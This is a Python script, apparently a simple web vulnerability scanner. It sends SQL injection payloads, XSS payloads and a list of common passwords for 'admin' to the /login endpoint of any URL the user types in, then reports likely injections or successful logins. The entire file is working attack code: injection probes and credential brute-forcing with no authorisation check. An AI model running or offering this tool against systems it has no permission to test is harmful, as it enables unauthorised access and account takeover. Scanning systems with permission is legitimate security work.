import requests

# List of common SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' UNION SELECT null, null --",
]

# List of common XSS payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg/onload=alert(1)>',
]

# Brute Force Testing (example with a small list of common passwords)
BRUTE_FORCE_PASSWORDS = [
    'password', '123456', '123456789', 'qwerty', 'abc123','abc123!'
]

def test_sql_injection(url, login_endpoint):
    for payload in SQLI_PAYLOADS:
        data = {'username': payload, 'password': 'password'}
        response = requests.post(url + login_endpoint, data=data)
        if 'SQL syntax' in response.text or 'error' in response.text.lower():
            print(f'[SQLi] Potential SQL Injection vulnerability with payload: {payload}')

def test_xss(url, login_endpoint):
    for payload in XSS_PAYLOADS:
        data = {'username': payload, 'password': 'password'}
        response = requests.post(url + login_endpoint, data=data)
        if payload in response.text:
            print(f'[XSS] Potential XSS vulnerability with payload: {payload}')

def test_brute_force(url, login_endpoint):
    for password in BRUTE_FORCE_PASSWORDS:
        data = {'username': 'admin', 'password': password}
        response = requests.post(url + login_endpoint, data=data)
        if 'Welcome' in response.text or 'Dashboard' in response.text:
            print(f'[Brute Force] Successful login with password: {password}')

def main():
    url = input('Enter the base URL of the website (e.g., http://example.com): ')
    login_endpoint = '/login'  # Adjust if your login form endpoint is different

    print('Testing for SQL Injection vulnerabilities...')
    test_sql_injection(url, login_endpoint)
    print('Testing for XSS vulnerabilities...')
    test_xss(url, login_endpoint)
    print('Testing for Brute Force vulnerabilities...')
    test_brute_force(url, login_endpoint)
    print('Testing completed.')

if __name__ == '__main__':
    main()
